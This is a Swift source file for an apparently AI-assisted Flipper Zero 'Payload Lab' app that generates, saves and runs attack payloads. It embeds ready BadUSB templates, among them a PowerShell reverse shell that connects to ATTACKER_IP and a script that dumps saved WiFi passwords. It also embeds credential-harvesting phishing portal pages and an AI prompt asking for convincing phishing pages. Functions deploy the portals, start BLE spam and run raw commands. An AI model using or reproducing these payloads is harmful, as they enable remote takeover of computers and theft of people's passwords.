import SwiftUI

// MARK: - Generation Phase

enum GenerationPhase: Equatable {
    case idle
    case generating
    case validating
    case ready
    case executing
    case complete
    case error(String)
}

// MARK: - Payload Lab Tab

enum PayloadLabTab: String, CaseIterable {
    case badusb = "BadUSB"
    case evilPortal = "Evil Portal"
    case quickActions = "Quick Actions"
}

// MARK: - BadUSB Template

struct BadUsbTemplate: Identifiable {
    let id: String
    let name: String
    let description: String
    let script: String

    static let rickroll = BadUsbTemplate(
        id: "rickroll",
        name: "Rickroll",
        description: "Opens a browser and navigates to Rick Astley",
        script: """
        REM Rickroll - Opens browser to Rick Astley
        DELAY 500
        GUI r
        DELAY 500
        STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ
        ENTER
        DELAY 1000
        """
    )

    static let wifiGrabber = BadUsbTemplate(
        id: "wifi_grabber",
        name: "WiFi Grabber",
        description: "Extracts saved WiFi passwords (Windows)",
        script: """
        REM WiFi Password Grabber - Windows
        REM For authorized penetration testing only
        DELAY 500
        GUI r
        DELAY 500
        STRING powershell
        ENTER
        DELAY 1000
        STRING (netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)} | Select-String 'Key Content\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize
        ENTER
        DELAY 2000
        """
    )

    static let reverseShell = BadUsbTemplate(
        id: "reverse_shell",
        name: "Reverse Shell",
        description: "Opens a reverse shell connection (Windows)",
        script: """
        REM Reverse Shell - Windows PowerShell
        REM Replace IP and PORT with your listener
        DELAY 500
        GUI r
        DELAY 500
        STRING powershell -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
        ENTER
        """
    )

    static let custom = BadUsbTemplate(
        id: "custom",
        name: "Custom",
        description: "Generate a custom BadUSB script with AI",
        script: ""
    )

    static let allTemplates: [BadUsbTemplate] = [rickroll, wifiGrabber, reverseShell, custom]
}

// MARK: - Evil Portal Type

enum EvilPortalType: String, CaseIterable {
    case wifiLogin = "WiFi Login"
    case socialMedia = "Social Media"
    case generic = "Generic"

    var templateHTML: String {
        switch self {
        case .wifiLogin:
            return """
            <!DOCTYPE html>
            <html>
            <head>
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <title>WiFi Login</title>
                <style>
                    body { font-family: -apple-system, sans-serif; background: #f5f5f5; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
                    .container { background: white; border-radius: 12px; padding: 30px; max-width: 400px; width: 100%; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                    h1 { font-size: 22px; color: #333; text-align: center; }
                    p { color: #666; text-align: center; font-size: 14px; }
                    input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
                    button { width: 100%; padding: 12px; background: #007AFF; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; margin-top: 10px; }
                    button:hover { background: #0056CC; }
                </style>
            </head>
            <body>
                <div class="container">
                    <h1>Free WiFi Access</h1>
                    <p>Enter your credentials to connect</p>
                    <form method="POST" action="/login">
                        <input type="email" name="email" placeholder="Email address" required>
                        <input type="password" name="password" placeholder="Password" required>
                        <button type="submit">Connect</button>
                    </form>
                </div>
            </body>
            </html>
            """
        case .socialMedia:
            return """
            <!DOCTYPE html>
            <html>
            <head>
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <title>Login</title>
                <style>
                    body { font-family: -apple-system, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
                    .container { background: white; border-radius: 12px; padding: 30px; max-width: 400px; width: 100%; box-shadow: 0 4px 20px rgba(0,0,0,0.2); }
                    .logo { text-align: center; font-size: 32px; margin-bottom: 10px; }
                    h1 { font-size: 20px; color: #333; text-align: center; margin: 0 0 20px; }
                    input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
                    button { width: 100%; padding: 12px; background: #5B51D8; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; margin-top: 10px; }
                    .divider { text-align: center; color: #999; margin: 15px 0; font-size: 12px; }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="logo">&#128274;</div>
                    <h1>Sign In to Continue</h1>
                    <form method="POST" action="/login">
                        <input type="text" name="username" placeholder="Username or email" required>
                        <input type="password" name="password" placeholder="Password" required>
                        <button type="submit">Sign In</button>
                    </form>
                    <div class="divider">Secure connection</div>
                </div>
            </body>
            </html>
            """
        case .generic:
            return """
            <!DOCTYPE html>
            <html>
            <head>
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <title>Portal</title>
                <style>
                    body { font-family: -apple-system, sans-serif; background: #1a1a2e; color: white; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
                    .container { background: #16213e; border-radius: 12px; padding: 30px; max-width: 400px; width: 100%; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
                    h1 { font-size: 22px; text-align: center; color: #e94560; }
                    p { color: #aaa; text-align: center; font-size: 14px; }
                    input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #333; border-radius: 8px; box-sizing: border-box; font-size: 16px; background: #0f3460; color: white; }
                    button { width: 100%; padding: 12px; background: #e94560; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; margin-top: 10px; }
                </style>
            </head>
            <body>
                <div class="container">
                    <h1>Captive Portal</h1>
                    <p>Authentication required to proceed</p>
                    <form method="POST" action="/login">
                        <input type="text" name="username" placeholder="Username" required>
                        <input type="password" name="password" placeholder="Password" required>
                        <button type="submit">Authenticate</button>
                    </form>
                </div>
            </body>
            </html>
            """
        }
    }
}

// MARK: - ViewModel

@Observable
class PayloadLabViewModel {
    private let payloadEngine: PayloadEngine
    private let fileSystem: FlipperFileSystem
    private let commandExecutor: CommandExecutor

    // MARK: - Tab State

    var selectedTab: PayloadLabTab = .badusb

    // MARK: - Generation Phase

    var phase: GenerationPhase = .idle
    var phaseMessage: String = ""

    // MARK: - Common State

    var error: String?
    var successMessage: String?

    // MARK: - BadUSB State

    var badUsbPrompt: String = ""
    var selectedTemplate: BadUsbTemplate? = nil
    var generatedScript: String?
    var scriptName: String = "payload"

    // MARK: - Evil Portal State

    var portalPrompt: String = ""
    var selectedPortalType: EvilPortalType = .wifiLogin
    var generatedHTML: String?
    var portalName: String = "portal"

    // MARK: - Quick Actions State

    var quickActionPath: String = ""
    var quickActionSignalName: String = ""
    var quickActionProtocol: String = "apple_ble"
    var quickActionCliCommand: String = ""
    var isExecuting: Bool = false

    // MARK: - Legacy (kept for backward compat with existing generate flow)

    var payloadType: String = "subghz"
    var prompt: String = ""
    var isGenerating: Bool = false
    var generatedPayload: GeneratedPayload?
    var validation: PayloadValidation?
    var isSaving: Bool = false

    static let payloadTypes = [
        ("subghz", "Sub-GHz", "antenna.radiowaves.left.and.right"),
        ("ir", "Infrared", "dot.radiowaves.right"),
        ("nfc", "NFC", "wave.3.right"),
        ("rfid", "RFID", "sensor.tag.radiowaves.forward"),
        ("ibutton", "iButton", "key.fill"),
        ("badusb", "BadUSB", "keyboard"),
    ]

    init(payloadEngine: PayloadEngine, fileSystem: FlipperFileSystem, commandExecutor: CommandExecutor) {
        self.payloadEngine = payloadEngine
        self.fileSystem = fileSystem
        self.commandExecutor = commandExecutor
    }

    // MARK: - BadUSB Pipeline

    /// Step 1: Generate a BadUSB script using AI or load from template
    func generateBadUsbScript(prompt: String) {
        let trimmed = prompt.trimmingCharacters(in: .whitespacesAndNewlines)
        guard !trimmed.isEmpty else {
            error = "Please describe what you want the script to do"
            return
        }

        phase = .generating
        phaseMessage = "Generating BadUSB script..."
        error = nil
        successMessage = nil
        generatedScript = nil

        Task {
            do {
                let command = ExecuteCommand(
                    action: .forgePayload,
                    args: CommandArgs(
                        prompt: trimmed,
                        payloadType: "badusb"
                    ),
                    justification: "User requested BadUSB script generation",
                    expectedEffect: "AI generates a DuckyScript payload"
                )

                let result = await commandExecutor.execute(command, sessionId: "payload-lab-\(UUID().uuidString)")

                if result.requiresConfirmation {
                    phaseMessage = "Awaiting approval..."
                    return
                }

                if result.success, let content = result.data?.content {
                    generatedScript = content
                    phase = .validating
                    phaseMessage = "Validating script..."
                    validateBadUsbScript()
                } else {
                    phase = .error(result.error ?? "Generation failed")
                    error = result.error ?? "Generation failed"
                }
            }
        }
    }

    /// Step 2: Validate BadUSB script syntax
    func validateBadUsbScript() {
        guard let script = generatedScript else {
            phase = .error("No script to validate")
            return
        }

        let validCommands: Set<String> = [
            "REM", "STRING", "STRINGLN", "DELAY", "ENTER", "RETURN",
            "GUI", "WINDOWS", "COMMAND", "CTRL", "CONTROL", "ALT",
            "SHIFT", "TAB", "ESC", "ESCAPE", "UPARROW", "UP",
            "DOWNARROW", "DOWN", "LEFTARROW", "LEFT", "RIGHTARROW", "RIGHT",
            "CAPSLOCK", "DELETE", "BACKSPACE", "END", "HOME", "INSERT",
            "NUMLOCK", "PAGEUP", "PAGEDOWN", "PRINTSCREEN", "SCROLLLOCK",
            "SPACE", "PAUSE", "BREAK", "MENU", "APP",
            "F1", "F2", "F3", "F4", "F5", "F6",
            "F7", "F8", "F9", "F10", "F11", "F12",
            "REPEAT", "SYSRQ", "WAIT_FOR_BUTTON_PRESS",
            "DEFAULT_DELAY", "DEFAULTDELAY", "ID"
        ]

        let lines = script.components(separatedBy: .newlines)
        var warnings: [String] = []
        var hasContent = false

        for (index, line) in lines.enumerated() {
            let trimmed = line.trimmingCharacters(in: .whitespaces)
            if trimmed.isEmpty { continue }
            hasContent = true

            let firstWord = trimmed.split(separator: " ", maxSplits: 1).first.map(String.init) ?? trimmed
            if !validCommands.contains(firstWord.uppercased()) {
                warnings.append("Line \(index + 1): Unknown command '\(firstWord)'")
            }
        }

        if !hasContent {
            phase = .error("Script has no executable commands")
            error = "Script has no executable commands"
            return
        }

        if warnings.isEmpty {
            phaseMessage = "Validation passed"
            phase = .ready
        } else {
            phaseMessage = "Validation passed with \(warnings.count) warning(s): \(warnings.first ?? "")"
            phase = .ready // Warnings don't block, only errors do
        }
    }

    /// Step 3a: Save BadUSB script to Flipper
    func saveBadUsbScript(name: String? = nil) {
        guard let script = generatedScript else { return }
        let saveName = (name ?? scriptName).trimmingCharacters(in: .whitespacesAndNewlines)
        let sanitized = saveName.isEmpty ? "payload" : sanitizeFilename(saveName)
        let path = "/ext/badusb/\(sanitized).txt"

        phase = .executing
        phaseMessage = "Saving to \(path)..."
        error = nil

        Task {
            let command = ExecuteCommand(
                action: .writeFile,
                args: CommandArgs(
                    path: path,
                    content: script
                ),
                justification: "Save BadUSB script to Flipper",
                expectedEffect: "Write DuckyScript file to /ext/badusb/"
            )

            let result = await commandExecutor.execute(command, sessionId: "payload-lab-\(UUID().uuidString)")

            if result.requiresConfirmation {
                phaseMessage = "Awaiting approval to write file..."
                return
            }

            if result.success {
                phase = .complete
                phaseMessage = "Saved to \(path)"
                successMessage = "Script saved to \(path)"
            } else {
                phase = .error(result.error ?? "Save failed")
                error = result.error ?? "Failed to save script"
            }
        }
    }

    /// Step 3b: Execute BadUSB script on Flipper
    func executeBadUsb(path: String? = nil) {
        let scriptPath: String
        if let path = path {
            scriptPath = path
        } else {
            let name = scriptName.isEmpty ? "payload" : sanitizeFilename(scriptName)
            scriptPath = "/ext/badusb/\(name).txt"
        }

        phase = .executing
        phaseMessage = "Executing BadUSB script..."
        error = nil

        Task {
            // If we have a generated script that hasn't been saved yet, save first
            if let script = generatedScript, path == nil {
                let saveCommand = ExecuteCommand(
                    action: .writeFile,
                    args: CommandArgs(
                        path: scriptPath,
                        content: script
                    ),
                    justification: "Save BadUSB script before execution",
                    expectedEffect: "Write DuckyScript file to Flipper"
                )
                let saveResult = await commandExecutor.execute(saveCommand, sessionId: "payload-lab-\(UUID().uuidString)")
                if !saveResult.success && !saveResult.requiresConfirmation {
                    phase = .error(saveResult.error ?? "Failed to save before execution")
                    error = saveResult.error
                    return
                }
                if saveResult.requiresConfirmation {
                    phaseMessage = "Awaiting approval to write file..."
                    return
                }
            }

            let command = ExecuteCommand(
                action: .badusbExecute,
                args: CommandArgs(
                    path: scriptPath
                ),
                justification: "Execute BadUSB script on Flipper",
                expectedEffect: "Run DuckyScript via Flipper BadUSB"
            )

            let result = await commandExecutor.execute(command, sessionId: "payload-lab-\(UUID().uuidString)")

            if result.requiresConfirmation {
                phaseMessage = "Awaiting approval to execute BadUSB..."
                return
            }

            if result.success {
                phase = .complete
                phaseMessage = "BadUSB script executed"
                successMessage = "Script executed successfully"
            } else {
                phase = .error(result.error ?? "Execution failed")
                error = result.error ?? "Failed to execute script"
            }
        }
    }

    /// Load a BadUSB template
    func loadTemplate(_ template: BadUsbTemplate) {
        selectedTemplate = template
        if template.id == "custom" {
            generatedScript = nil
            phase = .idle
        } else {
            generatedScript = template.script
            scriptName = template.id
            phase = .ready
            phaseMessage = "Template loaded"
        }
    }

    // MARK: - Evil Portal Pipeline

    /// Generate an Evil Portal HTML page
    func generateEvilPortal(type: EvilPortalType) {
        phase = .generating
        phaseMessage = "Generating Evil Portal..."
        error = nil
        successMessage = nil
        generatedHTML = nil
        selectedPortalType = type

        let trimmedPrompt = portalPrompt.trimmingCharacters(in: .whitespacesAndNewlines)

        if trimmedPrompt.isEmpty {
            // Use the built-in template
            generatedHTML = type.templateHTML
            phase = .ready
            phaseMessage = "Portal template loaded"
            return
        }

        // Use AI to generate a custom portal
        Task {
            let command = ExecuteCommand(
                action: .forgePayload,
                args: CommandArgs(
                    prompt: "Generate an Evil Portal HTML captive portal page. Type: \(type.rawValue). Details: \(trimmedPrompt). The HTML should be a single self-contained file with inline CSS. Include a login form that POSTs to /login with username/email and password fields. Make it look professional and convincing.",
                    payloadType: "evil_portal"
                ),
                justification: "User requested Evil Portal generation",
                expectedEffect: "AI generates HTML captive portal page"
            )

            let result = await commandExecutor.execute(command, sessionId: "payload-lab-\(UUID().uuidString)")

            if result.requiresConfirmation {
                phaseMessage = "Awaiting approval..."
                return
            }

            if result.success, let content = result.data?.content {
                generatedHTML = content
                phase = .ready
                phaseMessage = "Portal generated"
            } else {
                phase = .error(result.error ?? "Generation failed")
                error = result.error ?? "Portal generation failed"
            }
        }
    }

    /// Deploy Evil Portal HTML to Flipper
    func deployEvilPortal(name: String? = nil) {
        guard let html = generatedHTML else { return }
        let saveName = (name ?? portalName).trimmingCharacters(in: .whitespacesAndNewlines)
        let sanitized = saveName.isEmpty ? "portal" : sanitizeFilename(saveName)
        let path = "/ext/apps_data/evil_portal/portals/\(sanitized)/index.html"

        phase = .executing
        phaseMessage = "Deploying portal to Flipper..."
        error = nil

        Task {
            // Create directory first
            let mkdirCommand = ExecuteCommand(
                action: .createDirectory,
                args: CommandArgs(
                    path: "/ext/apps_data/evil_portal/portals/\(sanitized)"
                ),
                justification: "Create directory for Evil Portal",
                expectedEffect: "Create portal directory on Flipper"
            )
            let mkdirResult = await commandExecutor.execute(mkdirCommand, sessionId: "payload-lab-\(UUID().uuidString)")

            if mkdirResult.requiresConfirmation {
                phaseMessage = "Awaiting approval to create directory..."
                return
            }

            // Write HTML file
            let command = ExecuteCommand(
                action: .writeFile,
                args: CommandArgs(
                    path: path,
                    content: html
                ),
                justification: "Deploy Evil Portal HTML to Flipper",
                expectedEffect: "Write captive portal HTML file"
            )

            let result = await commandExecutor.execute(command, sessionId: "payload-lab-\(UUID().uuidString)")

            if result.requiresConfirmation {
                phaseMessage = "Awaiting approval to write portal..."
                return
            }

            if result.success {
                phase = .complete
                phaseMessage = "Portal deployed to \(path)"
                successMessage = "Evil Portal deployed to \(path)"
            } else {
                phase = .error(result.error ?? "Deploy failed")
                error = result.error ?? "Failed to deploy portal"
            }
        }
    }

    // MARK: - Quick Actions

    /// Transmit a Sub-GHz signal
    func transmitSubGhz(path: String) {
        let trimmed = path.trimmingCharacters(in: .whitespacesAndNewlines)
        guard !trimmed.isEmpty else {
            error = "Please enter a file path"
            return
        }

        isExecuting = true
        error = nil
        successMessage = nil

        Task {
            let command = ExecuteCommand(
                action: .subghzTransmit,
                args: CommandArgs(path: trimmed),
                justification: "User requested Sub-GHz transmission",
                expectedEffect: "Transmit Sub-GHz signal from file"
            )

            let result = await commandExecutor.execute(command, sessionId: "payload-lab-\(UUID().uuidString)")

            if result.requiresConfirmation {
                successMessage = "Awaiting approval for Sub-GHz transmit..."
            } else if result.success {
                successMessage = "Sub-GHz signal transmitted"
            } else {
                error = result.error ?? "Sub-GHz transmit failed"
            }
            isExecuting = false
        }
    }

    /// Transmit an IR signal
    func transmitIR(path: String, signalName: String? = nil) {
        let trimmed = path.trimmingCharacters(in: .whitespacesAndNewlines)
        guard !trimmed.isEmpty else {
            error = "Please enter a file path"
            return
        }

        isExecuting = true
        error = nil
        successMessage = nil

        Task {
            let command = ExecuteCommand(
                action: .irTransmit,
                args: CommandArgs(
                    path: trimmed,
                    signalName: signalName?.trimmingCharacters(in: .whitespacesAndNewlines)
                ),
                justification: "User requested IR transmission",
                expectedEffect: "Transmit IR signal from file"
            )

            let result = await commandExecutor.execute(command, sessionId: "payload-lab-\(UUID().uuidString)")

            if result.requiresConfirmation {
                successMessage = "Awaiting approval for IR transmit..."
            } else if result.success {
                successMessage = "IR signal transmitted"
            } else {
                error = result.error ?? "IR transmit failed"
            }
            isExecuting = false
        }
    }

    /// Start BLE spam
    func startBleSpam(protocol bleProtocol: String) {
        isExecuting = true
        error = nil
        successMessage = nil

        Task {
            let command = ExecuteCommand(
                action: .bleSpam,
                args: CommandArgs(protocol: bleProtocol),
                justification: "User requested BLE spam",
                expectedEffect: "Start BLE advertisement spam"
            )

            let result = await commandExecutor.execute(command, sessionId: "payload-lab-\(UUID().uuidString)")

            if result.requiresConfirmation {
                successMessage = "Awaiting approval for BLE spam..."
            } else if result.success {
                successMessage = "BLE spam started (\(bleProtocol))"
            } else {
                error = result.error ?? "BLE spam failed"
            }
            isExecuting = false
        }
    }

    /// Execute a raw CLI command
    func executeCliCommand(command cliCommand: String) {
        let trimmed = cliCommand.trimmingCharacters(in: .whitespacesAndNewlines)
        guard !trimmed.isEmpty else {
            error = "Please enter a command"
            return
        }

        isExecuting = true
        error = nil
        successMessage = nil

        Task {
            let command = ExecuteCommand(
                action: .executeCli,
                args: CommandArgs(command: trimmed),
                justification: "User requested CLI command execution",
                expectedEffect: "Execute raw CLI command on Flipper"
            )

            let result = await commandExecutor.execute(command, sessionId: "payload-lab-\(UUID().uuidString)")

            if result.requiresConfirmation {
                successMessage = "Awaiting approval for CLI command..."
            } else if result.success {
                let output = result.data?.content ?? result.data?.message ?? "Command executed"
                successMessage = output
            } else {
                error = result.error ?? "CLI command failed"
            }
            isExecuting = false
        }
    }

    // MARK: - Legacy Generate (backward compat)

    func generate() {
        guard !prompt.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty else { return }
        isGenerating = true
        error = nil
        generatedPayload = nil
        validation = nil

        Task {
            do {
                let payload = try await payloadEngine.generatePayload(type: payloadType, prompt: prompt)
                generatedPayload = payload
                validation = payloadEngine.validatePayload(payload)
            } catch {
                self.error = error.localizedDescription
            }
            isGenerating = false
        }
    }

    func saveToFlipper() {
        guard let payload = generatedPayload else { return }
        isSaving = true
        error = nil

        Task {
            do {
                let path = "/ext/\(payloadType)/\(payload.filename)"
                _ = try await fileSystem.writeFile(path, content: payload.content)
            } catch {
                self.error = error.localizedDescription
            }
            isSaving = false
        }
    }

    // MARK: - State Management

    func clearError() {
        error = nil
    }

    func clearSuccess() {
        successMessage = nil
    }

    func resetBadUsb() {
        generatedScript = nil
        badUsbPrompt = ""
        scriptName = "payload"
        selectedTemplate = nil
        phase = .idle
        phaseMessage = ""
        error = nil
        successMessage = nil
    }

    func resetEvilPortal() {
        generatedHTML = nil
        portalPrompt = ""
        portalName = "portal"
        selectedPortalType = .wifiLogin
        phase = .idle
        phaseMessage = ""
        error = nil
        successMessage = nil
    }

    // MARK: - Helpers

    private func sanitizeFilename(_ name: String) -> String {
        let cleaned = name.unicodeScalars
            .filter { CharacterSet.alphanumerics.contains($0) || $0 == "_" || $0 == "-" }
            .map { String($0) }
            .joined()
        return cleaned.isEmpty ? "untitled" : String(cleaned.prefix(40))
    }
}
